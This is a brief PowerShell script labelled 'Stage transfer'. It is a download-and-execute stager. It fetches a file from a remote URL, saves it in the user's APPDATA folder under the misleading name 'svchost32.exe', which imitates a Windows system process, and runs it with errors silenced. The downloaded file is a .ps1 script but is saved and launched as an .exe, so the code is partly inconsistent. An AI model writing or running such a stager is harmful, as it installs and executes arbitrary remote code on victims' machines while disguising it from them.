<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://example.net/updater.ps1',
    [string]$OutputPath = "$env:APPDATA\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $OutputPath)
Start-Process -FilePath $OutputPath -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
